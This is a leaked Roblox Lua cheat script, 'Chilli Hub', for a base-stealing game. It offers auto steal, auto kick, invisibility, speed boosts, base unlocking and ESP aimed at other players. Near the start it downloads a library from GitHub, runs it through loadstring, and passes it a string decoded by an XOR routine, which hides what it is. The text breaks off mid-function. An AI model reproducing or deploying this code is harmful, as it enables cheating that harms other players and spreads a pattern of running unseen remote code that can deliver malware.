--- Leaked By KIRA LEAKS
--- "I look up to provide the finest open sources, against everything that is paid in games"

local chilliGithubFastManualDefaultsRu, obj1, obj7, defaultTab, esp, Misc, Server, obj8, Players, RunService
local Workspace, Lighting, CoreGui, HttpService, ReplicatedStorage, UserInputService, TeleportService, TextService, Stats, localPlayer
local obj9, func1, obj, tbl1, obj10, flag1, func2, tbl2, func3, obj11
local obj12, obj13

do
	local obj14, ContextActionService, obj15, obj16

	do
		local Helper, ProximityPromptService, TweenService, obj17, flag2, n, flag3, flag4, flag5, n2
		local flag6, n3, flag7, n4, RagdollController, UserInputService2, connection, flag8, n5, n6
		local prompt, tbl3, n7, folder, bindableEvent, func4, func5, func6, func7, func8
		local func9, prompt2, func10, func11, func12, flag9, func13, func14, screenGui, func15
		local func16, func17, func18, func19, screenGui2, frame, textLabel, textLabel2, frame2

		do
			local value1 = rawget(_G, "__ChilliGithubFastManualDefaultsRun")

			if type(value1) == "table" then
				local window = value1.Window

				if type(window) == "table" and window._destroyed ~= true then
					pcall(function()
						window:Open()
					end)

					return
				end

				local now = tonumber(value1.StartedAt) or os.clock()
				if value1.Status == "loading" and os.clock() - now < 30 then
					return
				end
			end

			chilliGithubFastManualDefaultsRu = { Status = "loading", StartedAt = os.clock() }
			_G.__ChilliGithubFastManualDefaultsRun = chilliGithubFastManualDefaultsRu

			local function func20()
				local response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/Chilli%20Library")
				local chunk, value2 = loadstring(response)
				assert(chunk, value2)
				local result1 = chunk()
				assert(type(result1) == "function", "Chilli Library bootstrap is invalid.")
				local arr1 = table.create(45)
				local n8 = 1

				for i_ = 1, 90, 2 do
					arr1[n8] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i_, i_ + 1), 16), string.byte("s9K!2vQ#", (n8 - 1) % 8 + 1)))
					n8 += 1
				end

				return result1(table.concat(arr1))
			end

			obj1 = func20()
			assert(type(obj1) == "table" and type(obj1.CreateWindow) == "function" and type(obj1.Finalize) == "function", "Chilli Library returned an invalid API.")
			chilliGithubFastManualDefaultsRu.Library = obj1

			obj1.ManualQuickDefaults = {
				PinnedFeatures = {
					"Stealer > Auto Steal Brainrot > Auto Steal",
					"Helper > Movement & Combat > Float",
					"Helper > Movement & Combat > Auto Hit Nearest Player",
					"Player > Jump Boost > Auto Jump",
					"Player > Jump Boost > Limit Jump Height",
					"Player > Invisibility > Invisible",
					"Server > Server > Kick",
					"Helper > Unlock Base > Auto Unlock Base",
					"Helper > Unlock Base > Unlock Floor 3",
					"Helper > Unlock Base > Unlock Floor 2",
					"Helper > Unlock Base > Unlock Floor 1",
					"Player > Respawn > Fast Reset",
					"Player > Speed Boost > Tool Speed Boost",
					"Stealer > Auto Steal Brainrot > Drop Brainrot",
					"Helper > Helper > Instant Clone Swap",
					"Player > Speed Boost > Adjust Auto Speed",
					"Player > Invisibility > Auto Invisible On Steal",
					"Player > Invisibility > Rotation",
					"Player > Invisibility > Auto Rotation",
					"Player > Invisibility > Depth",
					"Player > Invisibility > Lagback Detect",
					"Player > Invisibility > Auto Fix Lagback",
				},
				Keybinds = {
					["Player > Respawn > Fast Reset"] = "X",
					["Player > Jump Boost > Limit Jump Height"] = "N",
					["Player > Speed Boost > Tool Speed Boost"] = "Q",
					["Player > Jump Boost > Auto Jump"] = "V",
					["Player > Invisibility > Invisible"] = "U",
					["Helper > Movement & Combat > Float"] = "B",
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = "G",
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = "R",
					["Server > Server > Kick"] = "J",
					["Helper > Helper > Instant Clone Swap"] = "F",
					["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true,
					["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true,
				},
				PinGroups = {
					["Player > Respawn > Fast Reset"] = 5,
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = 1,
					["Helper > Unlock Base > Unlock Floor 3"] = 4,
					["Helper > Helper > Instant Clone Swap"] = 5,
					["Player > Speed Boost > Adjust Speed"] = 2,
					["Player > Jump Boost > Jump Height"] = 1,
					["Player > Invisibility > Auto Rotation"] = 2,
					["Helper > Unlock Base > Auto Unlock Base"] = 4,
					["Helper > Aimbot > Auto Paintball"] = 3,
					["Helper > Unlock Base > Unlock Floor 1"] = 4,
					["Player > Speed Boost > Adjust Auto Speed"] = 2,
					["Player > Invisibility > Lagback Detect"] = 2,
					["Player > Invisibility > Auto Invisible On Steal"] = 2,
					["Player > Invisibility > Invisible"] = 2,
					["Player > Invisibility > Auto Fix Lagback"] = 2,
					["Player > Speed Boost > Tool Speed Boost"] = 1,
					["Player > Invisibility > Depth"] = 2,
					["Stealer > Auto Kick > Auto Kick on Steal"] = 5,
					["Helper > Helper > Anti Body Swap"] = 5,
					["Player > Invisibility > Rotation"] = 2,
					["Helper > Unlock Base > Unlock Floor 2"] = 4,
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = 5,
					["Server > Server > Kick"] = 5,
				},
				LeftCenterHidden = true,
			}

			obj7 = obj1:CreateWindow({ Name = "Chilli Hub", DefaultTab = "Main" })
			chilliGithubFastManualDefaultsRu.Window = obj7
			defaultTab = obj7:GetDefaultTab()
			local obj18

			do
				local Stealer = obj7:CreateTab("Stealer")
				Helper = obj7:CreateTab("Helper")
				obj14 = obj7:CreateTab({ Name = "Player", SectionsExpanded = false })
				esp = obj7:CreateTab("ESP")
				Misc = obj7:CreateTab("Misc")
				Server = obj7:CreateTab("Server")
				obj8 = obj7:CreateTab("AP&TP")
				Players = game:GetService("Players")
				RunService = game:GetService("RunService")
				Workspace = game:GetService("Workspace")
				Lighting = game:GetService("Lighting")
				CoreGui = game:GetService("CoreGui")
				HttpService = game:GetService("HttpService")
				ReplicatedStorage = game:GetService("ReplicatedStorage")
				UserInputService = game:GetService("UserInputService")
				ContextActionService = game:GetService("ContextActionService")
				TeleportService = game:GetService("TeleportService")
				ProximityPromptService = game:GetService("ProximityPromptService")
				TextService = game:GetService("TextService")
				TweenService = game:GetService("TweenService")
				Stats = game:GetService("Stats")
				localPlayer = Players.LocalPlayer
				local str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
				obj9 = Random.new()

				func1 = function()
					local arr2 = table.create(64)
					local list1 = HttpService:GenerateGUID(false):gsub("-", "")

					for i_ = 1, #list1 do
						arr2[#arr2 + 1] = list1:sub(i_, i_)
					end

					for i_ = 1, 32 do
						local value3 = obj9:NextInteger(1, #str1)
						arr2[#arr2 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):sub(value3, value3)
					end

					for i_ = #arr2, 2, -1 do
						local value4 = obj9:NextInteger(1, i_)
						local entry1 = arr2[i_]
						arr2[i_] = arr2[value4]
						arr2[value4] = entry1
					end

					return table.concat(arr2)
				end

				obj = setmetatable({}, { __mode = "k" })
				tbl1 = {}
				obj17 = Stealer:CreateSection({ Name = "Auto Steal Brainrot", Expanded = true })
				obj18 = Stealer:CreateSection({ Name = "Auto Kick", Expanded = true })
			end

			do
				local flag10 = false
				local flag11 = true
				local flag12 = false
				local n8 = 0
				local n9 = 1000000
				local value5 = nil
				local n10 = -math.huge
				local list2 = {}
				local obj2 = setmetatable({}, { __mode = "k" })
				local tbl4 = {}

				pcall(function()
					local Animals = require(ReplicatedStorage.Datas.Animals)

					if type(Animals) == "table" then
						tbl4 = Animals
					end
				end)

				local function func21(flag13)
					local match, value6 = tostring(flag13 or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
					if not match then
						return nil
					end
					local num1 = tonumber(match)
					if not num1 then
						return nil
					end
					return num1 * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(value6)] or 1)
				end

				local function func22(flag14)
					local entry2 = tbl4[tostring(flag14 or "")]
					return type(entry2) == "table" and tonumber(entry2.Generation) or 0
				end

				local function func23()
					local tbl5 = {}
					local debris = Workspace:FindFirstChild("Debris")
					if not debris then
						return tbl5
					end

					for _, child in ipairs(debris:GetChildren()) do
						if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
							local animalOverhead = child:FindFirstChild("AnimalOverhead")
							local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
							animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Generation")

							if displayName and animalOverhead and displayName:IsA("TextLabel") and animalOverhead:IsA("TextLabel") then
								local text3 = func21(animalOverhead.Text)

								if text3 then
									local text4 = tostring(displayName.Text)
									tbl5[text4] = tbl5[text4] or {}
									tbl5[text4][#tbl5[text4] + 1] = { Position = child.Position, Generation = text3 }
								end
							end
						end
					end

					return tbl5
				end

				local function func24(flag15, num2, flag16)
					local generation = func22(flag15)
					if not num2 then
						return generation
					end
					local value7, value8, value9 = ipairs((flag16 or func23())[tostring(flag15 or "")] or {})
					local n11 = 14

					for _, value10 in value7, value8, value9 do
						local magnitude = (value10.Position - num2).Magnitude

						if magnitude < n11 then
							generation = value10.Generation
							n11 = magnitude
						end
					end

					return generation
				end

				local function func25()
					local obj19 = Workspace:FindFirstChild(localPlayer.Name)
					if not obj19 or not obj19:IsA("Model") then
						return nil
					end
					return obj19:FindFirstChild("HumanoidRootPart") or obj19:FindFirstChild("__HITBOX")
				end

				local chilliAutoKickOnStealRuntime = CoreGui:FindFirstChild("__ChilliAutoKickOnStealRuntime")

				if chilliAutoKickOnStealRuntime then
					local cleanup = chilliAutoKickOnStealRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliAutoKickOnStealRuntime:Destroy()
					end)
				end

				local folder2 = Instance.new("Folder")
				folder2.Name = "__ChilliAutoKickOnStealRuntime"
				folder2.Archivable = false
				folder2.Parent = CoreGui
				local bindableEvent2 = Instance.new("BindableEvent")
				bindableEvent2.Name = "Cleanup"
				bindableEvent2.Parent = folder2

				local function func26()
					for _, item in ipairs(list2) do
						if item.Connected then
							item:Disconnect()
						end
					end

					table.clear(list2)
					table.clear(obj2)
				end

				local value11 = nil

				value11 = function(list3, tbl6, num3)
					local kind = typeof(list3)

					if kind == "string" then
						local lowered = string.lower(list3)
						if string.find(lowered, "you stole", 1, true) or string.find(lowered, "successfully stole", 1, true) then
							return list3
						end
						return nil
					end

					if kind ~= "table" or num3 >= 3 or tbl6[list3] then
						return nil
					end
					tbl6[list3] = true

					for k, value12 in pairs(list3) do
						local num4 = value11(k, tbl6, num3 + 1) or value11(value12, tbl6, num3 + 1)
						if num4 then
							return num4
						end
					end

					return nil
				end

				local function func27(...)
					if not flag10 then
						return
					end
					local packed1 = table.pack(...)
					local tbl7 = {}

					for i_ = 1, packed1.n do
						local value13 = value11(packed1[i_], tbl7, 0)

						if value13 then
							local matched = string.match(value13, ">([^<>]-)</font>")
							local result5 = func25()
							if func24(matched, result5 and result5.Position) < n9 then
								return
							end
							local flag17 = matched and matched ~= ""
							local str2 = "\nAUTO KICK ACTIVATED"

							if flag17 then
								str2 = "\nAUTO KICK ACTIVATED" .. "\nYou stole: " .. matched
							end

							flag10 = false
							return
						end
					end
				end

				local function func28(descendant)
					if not flag10 or not descendant:IsA("RemoteEvent") or obj2[descendant] then
						return
					end
					obj2[descendant] = true
					list2[#list2 + 1] = descendant.OnClientEvent:Connect(func27)
				end

				local function func29()
					flag10 = false
					func26()
				end

				local function func30()
					func29()
					flag10 = true
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Net")
					if not packages then
						flag10 = false
						return
					end

					for _, descendant in ipairs(packages:GetDescendants()) do
						func28(descendant)
					end

					func28(packages)
					list2[#list2 + 1] = packages.DescendantAdded:Connect(func28)
				end

				local function func31()
					flag11 = false
					flag12 = false
					n8 += 1
					func29()
				end

				bindableEvent2.Event:Connect(func31)
				folder2.Destroying:Connect(func31)

				obj18:CreateToggle({
					Name = "Auto Kick on Steal",
					Default = false,
					Callback = function(value)
						if value then
							func30()
						else
							func29()
						end
					end,
				})

				local tbl8 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
				}

				local value14 = nil
				local n11 = 1
				local str3 = "M/s"

				local function func32(flag18, flag19)
					if flag18 ~= nil then
						n11 = math.floor(tonumber(flag18) or n11)
					end

					if flag19 ~= nil then
						str3 = tostring(flag19)
					elseif value14 and value14.GetUnit then
						local unit = value14:GetUnit()

						if unit and unit ~= "" then
							str3 = tostring(unit)
						end
					end

					n9 = n11 * (tbl8[str3] or tbl8["M/s"]).Mult
					value5 = nil
					n10 = -math.huge
				end

				local function func33(param1)
					str3 = tostring(param1)
					local ms = tbl8[str3] or tbl8["M/s"]

					if value14 and value14.SetRange then
						value14:SetRange(ms.Min, ms.Max)
						local min = value14:Get() or ms.Min
						local min2 = ms.Min
						local max = ms.Max
						local n12 = math.clamp(math.floor(min + 0.5), min2, max)

						if n12 ~= min then
							value14:Set(n12)
						else
							func32(n12, str3)
						end
					else
						func32(nil, str3)
					end
				end

				value14 = obj18:CreateSlider({
					Name = "Auto Kick Min Value",
					Note = "Only kicks for Brainrots at or above this generation value.",
					Min = 0,
					Max = 1000,
					Default = 10,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(value)
							func33(value)
						end,
					},
					Quick = false,
					Callback = function(value)
						func32(value, nil)
					end,
				})
			end

			flag2 = "Steal"
			local n8
			n8 = 2
			n = 0.25
			flag3 = true
			flag4 = false
			flag5 = false
			n2 = 1000000
			flag6 = false
			n3 = 20
			flag7 = false
			n4 = 0
			RagdollController = nil

			pcall(function()
				RagdollController = require(game:GetService("ReplicatedStorage").Controllers.RagdollController)
			end)

			UserInputService2 = game:GetService("UserInputService")

			connection = UserInputService2.InputBegan:Connect(function(input, gameProcessed)
				if not gameProcessed and input.KeyCode == Enum.KeyCode.Backspace then
					n4 = os.clock()
				end
			end)

			flag8 = false
			n5 = 0
			local n9
			n9 = 0
			n6 = -math.huge
			prompt = nil
			tbl3 = {}
			n7 = -math.huge
			local func34

			do
				local list4 = {}
				local chilliAutoGetRuntime = CoreGui:FindFirstChild("__ChilliAutoGetRuntime")

				if chilliAutoGetRuntime then
					local cleanup = chilliAutoGetRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliAutoGetRuntime:Destroy()
					end)
				end

				folder = Instance.new("Folder")
				folder.Name = "__ChilliAutoGetRuntime"
				folder.Archivable = false
				folder.Parent = CoreGui
				bindableEvent = Instance.new("BindableEvent")
				bindableEvent.Name = "Cleanup"
				bindableEvent.Parent = folder

				func4 = function(param2)
					list4[#list4 + 1] = param2
					return param2
				end

				local n10 = 10
				local obj2 = setmetatable({}, { __mode = "k" })

				func34 = function(instance, param3)
					if not instance or not instance.Parent or not instance.Visible then
						return false
					end
					local absolutePosition = instance.AbsolutePosition
					local absoluteSize = instance.AbsoluteSize
					return param3.X >= absolutePosition.X and param3.X <= absolutePosition.X + absoluteSize.X and param3.Y >= absolutePosition.Y and param3.Y <= absolutePosition.Y + absoluteSize.Y
				end

				func4(UserInputService2.InputChanged:Connect(function(input)
					local entry3 = obj2[input]
					if not entry3 then
						return
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					entry3.Position = vector2

					if (vector2 - entry3.Start).Magnitude > n10 then
						entry3.Cancelled = true
					end
				end))

				func4(UserInputService2.InputEnded:Connect(function(input)
					local entry4 = obj2[input]
					if not entry4 then
						return
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					entry4.Position = vector2

					if (vector2 - entry4.Start).Magnitude > n10 or not func34(entry4.Button, vector2) then
						entry4.Cancelled = true
					end

					task.delay(0.2, function()
						if obj2[input] == entry4 then
							obj2[input] = nil
						end
					end)
				end))

				func5 = function(flag20, callback1)
					func4(flag20.InputBegan:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.Touch or input.UserInputState ~= Enum.UserInputState.Begin then
							return
						end
						local vector2 = Vector2.new(input.Position.X, input.Position.Y)

						if func34(flag20, vector2) then
							obj2[input] = { Button = flag20, Start = vector2, Position = vector2, Cancelled = false }
						end
					end))

					return func4(flag20.Activated:Connect(function(inputObject)
						if inputObject and inputObject.UserInputType == Enum.UserInputType.Touch then
							local entry5 = obj2[inputObject]
							if not entry5 or entry5.Button ~= flag20 or entry5.Cancelled or not func34(flag20, entry5.Position) then
								return
							end
						end

						callback1()
					end))
				end

				func6 = function()
					for _, item2 in ipairs(list4) do
						if item2.Connected then
							item2:Disconnect()
						end
					end

					table.clear(list4)
				end
			end

			local tbl9, tbl10, func35, func36, func37

			do
				local value15 = nil
				tbl9 = nil
				tbl10 = nil
				local datas = ReplicatedStorage:FindFirstChild("Datas")

				if datas then
					local animals = datas:FindFirstChild("Animals")

					if animals and animals:IsA("ModuleScript") then
						local ok, result = pcall(require, animals)

						if ok and type(result) == "table" then
							value15 = result
						end
					end

					local mutations = datas:FindFirstChild("Mutations")

					if mutations and mutations:IsA("ModuleScript") then
						local ok, result = pcall(require, mutations)

						if ok and type(result) == "table" then
							tbl9 = result
						end
					end

					local traits = datas:FindFirstChild("Traits")

					if traits and traits:IsA("ModuleScript") then
						local ok, result = pcall(require, traits)

						if ok and type(result) == "table" then
							tbl10 = result
						end
					end
				end

				func35 = function(flag21)
					return string.lower(tostring(flag21 or ""))
				end

				func36 = function(instance2)
					instance2 = instance2 and instance2.Parent

					while instance2 and instance2 ~= Workspace do
						if instance2:IsA("BasePart") and instance2.Name == "Spawn" then
							return instance2
						end
						instance2 = instance2.Parent
					end

					return nil
				end

				func37 = function(flag22)
					if not value15 or not flag22 or flag22 == "" then
						return 0
					end
					local entry6 = value15[flag22]
					if type(entry6) ~= "table" then
						return 0
					end
					return tonumber(entry6.Generation) or 0
				end
			end

			local brainrotNameTiers
			brainrotNameTiers = {}
			local tbl11
			tbl11 = { Limit = 1000000 }

			do
				local colorSequence = ColorSequence.new
				local value16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
				local value17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				local tbl12 = { value16, value17 }

				do
					local values = table.pack(new(1, color(214, 142, 12)))
					table.move(values, 1, values.n, 3, tbl12)
				end

				tbl11.Text = colorSequence(tbl12)
			end

			do
				local colorSequence = ColorSequence.new
				local value18 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
				local value19 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				local tbl13 = { value18, value19 }

				do
					local values = table.pack(new(1, color(20, 12, 0)))
					table.move(values, 1, values.n, 3, tbl13)
				end

				tbl11.Stroke = colorSequence(tbl13)
			end

			local tbl14
			tbl14 = { Limit = 10000000 }

			do
				local colorSequence = ColorSequence.new
				local value20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
				local value21 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				local tbl15 = { value20, value21 }

				do
					local values = table.pack(new(1, color(206, 92, 0)))
					table.move(values, 1, values.n, 3, tbl15)
				end

				tbl14.Text = colorSequence(tbl15)
			end

			do
				local colorSequence = ColorSequence.new
				local value22 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
				local value23 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				local tbl16 = { value22, value23 }

				do
					local values = table.pack(new(1, color(18, 8, 0)))
					table.move(values, 1, values.n, 3, tbl16)
				end

				tbl14.Stroke = colorSequence(tbl16)
			end

			do
				local tbl17 = { Limit = 100000000 }
				local colorSequence = ColorSequence.new
				local value24 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
				local value25 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				local tbl18 = { value24, value25 }

				do
					local values = table.pack(new(1, color(196, 42, 0)))
					table.move(values, 1, values.n, 3, tbl18)
				end

				tbl17.Text = colorSequence(tbl18)
				local colorSequence2 = ColorSequence.new
				local value26 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
				local value27 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
				local new2 = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				local tbl19 = { value26, value27 }

				do
					local values = table.pack(new2(1, color2(18, 4, 0)))
					table.move(values, 1, values.n, 3, tbl19)
				end

				tbl17.Stroke = colorSequence2(tbl19)
				local tbl20 = { Limit = math.huge }
				local colorSequence3 = ColorSequence.new
				local value28 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
				local value29 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
				local new3 = ColorSequenceKeypoint.new
				local color3 = Color3.fromRGB
				local tbl21 = { value28, value29 }

				do
					local values = table.pack(new3(1, color3(184, 0, 18)))
					table.move(values, 1, values.n, 3, tbl21)
				end

				tbl20.Text = colorSequence3(tbl21)
				local colorSequence4 = ColorSequence.new
				local value30 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
				local value31 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
				local new4 = ColorSequenceKeypoint.new
				local color4 = Color3.fromRGB
				local tbl22 = { value30, value31 }

				do
					local values = table.pack(new4(1, color4(18, 0, 3)))
					table.move(values, 1, values.n, 3, tbl22)
				end

				tbl20.Stroke = colorSequence4(tbl22)
				brainrotNameTiers[1] = tbl11
				brainrotNameTiers[2] = tbl14
				brainrotNameTiers[3] = tbl17
				brainrotNameTiers[4] = tbl20
			end

			chilliGithubFastManualDefaultsRu.BrainrotNameTiers = brainrotNameTiers

			chilliGithubFastManualDefaultsRu.BrainrotNameTier = function(param4)
				local n10 = tonumber(param4) or 0

				for _, brainrotNameTier in ipairs(chilliGithubFastManualDefaultsRu.BrainrotNameTiers) do
					if n10 < brainrotNameTier.Limit then
						return brainrotNameTier
					end
				end

				return chilliGithubFastManualDefaultsRu.BrainrotNameTiers[#chilliGithubFastManualDefaultsRu.BrainrotNameTiers]
			end

			chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle = function(parent)
				parent.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1.15
				uiStroke.Transparency = 0.08
				uiStroke.Parent = parent
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Rotation = 90
				uiGradient2.Parent = parent
				return { Label = parent, Outline = uiStroke, Text = uiGradient2, Stroke = uiGradient }
			end

			chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle = function(obj, param5)
				if not obj then
					return
				end

				if tonumber(param5) == nil then
					obj.Label.TextColor3 = Color3.fromRGB(238, 238, 242)
					obj.Outline.Color = Color3.fromRGB(0, 0, 0)
					obj.Outline.Transparency = 0.28
					obj.Text.Enabled = false
					obj.Stroke.Enabled = false
					return
				end

				local value32 = chilliGithubFastManualDefaultsRu.BrainrotNameTier(param5)
				obj.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
				obj.Outline.Transparency = 0.08
				obj.Text.Enabled = true
				obj.Stroke.Enabled = true
				obj.Text.Color = value32.Text
				obj.Stroke.Color = value32.Stroke
			end

			do
				local n10 = 0.5
				local obj2 = setmetatable({}, { __mode = "k" })

				local function func38(param6)
					local obj20 = func36(param6)
					if not obj20 then
						return false
					end

					if func35(obj20.Name) == "lucky block" then
						return true
					end

					for _, descendant in ipairs(obj20:GetDescendants()) do
						if descendant:IsA("TextLabel") and func35(descendant.Name) == "stolen" and descendant.Visible and func35(descendant.Text) == "fusing" then
							return true
						end
					end

					return false
				end

				func7 = function(param7)
					local now = os.clock()
					local entry7 = obj2[param7]
					if entry7 and now < entry7.ExpiresAt then
						return entry7.Value
					end
					local value33 = func38(param7)

					if entry7 then
						entry7.Value = value33
						entry7.ExpiresAt = now + n10
					else
						obj2[param7] = { Value = value33, ExpiresAt = now + n10 }
					end

					return value33
				end
			end

			func8 = function(param8)
				local n10 = tonumber(param8) or 0
				if n10 >= 1e9 then
					return string.format("%.2fB/s", n10 / 1e9)
				end

				if n10 >= 1000000 then
					return string.format("%.2fM/s", n10 / 1000000)
				end

				if n10 >= 1000 then
					return string.format("%.1fK/s", n10 / 1000)
				end
				return string.format("%d/s", math.floor(n10))
			end

			do
				local function func39(text5)
					if not text5 or text5 == "" then
						return nil
					end
					local match, obj21 = text5:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

					if match then
						local n10 = tonumber(match) or 0
						local flag23 = obj21:upper()

						if flag23 == "K" then
							n10 *= 1000
						elseif flag23 == "M" then
							n10 *= 1000000
						elseif flag23 == "B" then
							n10 *= 1e9
						elseif flag23 == "T" then
							n10 *= 1e12
						end

						return n10
					end

					return nil
				end

				local function func40(part2, instance3, param9, list5)
					local num5 = func37(param9)
					part2 = part2 and part2.Position
					if not part2 then
						return num5
					end
					local value34 = list5 and list5[param9]
					local overhead = nil

					if value34 then
						local value35, value36, value37 = ipairs(list5[param9])
						local n10 = 14
						overhead = nil

						for _, value38 in value35, value36, value37 do
							local magnitude = (value38.Position - part2).Magnitude

							if magnitude < n10 then
								overhead = value38.Overhead
								n10 = magnitude
							end
						end
					end

					local value39 = nil

					if instance3 then
						local value40, value41, value42 = ipairs(instance3:GetChildren())
						local n10 = 14
						value39 = nil

						for _, value43 in value40, value41, value42 do
							if value43:IsA("Model") and value43.Name == param9 then
								local rootPart = value43:FindFirstChild("RootPart") or value43.PrimaryPart or value43:FindFirstChildWhichIsA("BasePart")

								if rootPart then
									local magnitude = (rootPart.Position - part2).Magnitude

									if magnitude < n10 then
										n10 = magnitude
										value39 = value43
									end
								end
							end
						end
					end

					local text

					if overhead and overhead:FindFirstChild("Mutation") and overhead.Mutation.Visible and overhead.Mutation.Text ~= "" then
						text = overhead.Mutation.Text
					else
						text = nil

						if value39 then
							local attribute = value39:GetAttribute("Mutation") or value39:GetAttribute("__mutation")
							local flag24 = attribute and tostring(attribute) ~= ""
							text = nil

							if flag24 then
								text = tostring(attribute)
							end
						end
					end

					local tbl23 = {}
					local tbl24 = {}

					if value39 then
						for _, child in ipairs(value39:GetChildren()) do
							local match = child.Name:match("^_Trait%.(.+)$")

							if match and not tbl24[match] then
								tbl24[match] = true
								table.insert(tbl23, match)
							end
						end

						local attribute = value39:GetAttribute("Trait") or value39:GetAttribute("Traits")

						if attribute then
							local str4 = tostring(attribute)

							if not tbl24[str4] then
								tbl24[str4] = true
								table.insert(tbl23, str4)
							end
						end
					end

					local value44 = text and tbl9 and tbl9[text]
					local n10 = 1

					if value44 then
						n10 = 1 + (tonumber(tbl9[text].Modifier) or 0)
					end

					local flag25 = false

					if tbl10 then
						for _, item3 in ipairs(tbl23) do
							local value45 = tbl10[item3] or tbl10[item3:gsub("_", " ")]

							if value45 then
								if item3 == "Sleepy" or value45.Name == "Sleepy" then
									flag25 = true
								else
									n10 += tonumber(value45.MultiplierModifier) or 0
								end
							end
						end
					end

					local num6 = math.round(num5 * n10 * (flag25 and 0.5 or 1))
					local flag26 = func39(overhead and overhead:FindFirstChild("Generation") and overhead.Generation.Text)
					if flag26 and flag26 > num6 then
						return flag26
					end
					return num6 > 0 and num6 or flag26 or num5
				end

				func9 = function(flag27)
					local now = os.clock()
					if not flag27 and now - n7 < n8 then
						return
					end
					n7 = now
					local list6 = {}
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						tbl3 = list6
						return
					end
					local debris = Workspace:FindFirstChild("Debris")
					local tbl25 = {}

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
								local animalOverhead = child:FindFirstChild("AnimalOverhead")
								local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

								if displayName and displayName:IsA("TextLabel") and displayName.Text ~= "" then
									local text = displayName.Text
									tbl25[text] = tbl25[text] or {}
									table.insert(tbl25[text], { Position = child.Position, Overhead = animalOverhead })
								end
							end
						end
					end

					for _, child in ipairs(plots:GetChildren()) do
						local animalPodiums = child:FindFirstChild("AnimalPodiums")

						if animalPodiums then
							for _, child2 in ipairs(animalPodiums:GetChildren()) do
								local base = child2:FindFirstChild("Base")
								base = base and base:FindFirstChild("Spawn")

								if base and base:IsA("BasePart") then
									local promptAttachment = base:FindFirstChild("PromptAttachment")
									local func41 = ipairs
									promptAttachment = promptAttachment or base
									local value46 = nil

									for _, descendant in func41(promptAttachment:GetDescendants()) do
										if descendant:IsA("ProximityPrompt") and tostring(descendant.ActionText) == flag2 then
											value46 = descendant
											break
										else
